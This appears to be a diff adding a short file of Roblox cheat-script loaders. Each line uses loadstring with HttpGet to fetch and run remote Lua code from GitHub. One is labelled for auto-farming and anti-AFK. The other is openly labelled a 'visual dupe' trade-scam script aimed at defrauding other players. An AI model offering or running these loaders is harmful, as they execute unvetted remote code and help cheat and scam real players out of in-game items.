@@ -1,0 +1,5 @@
+AUTO FARM / FAST AUTO HATCH / EGG SKIP , ANTI AFK SCRIPT
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Maskslasher112/RobloxScripts/main/psx-james.lua"))()
+
+VISUAL DUPE SCRIPT / TRADE SCAM
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Maskslasher112/RobloxVisualTradeScamScript/main/NFV4.9"))()
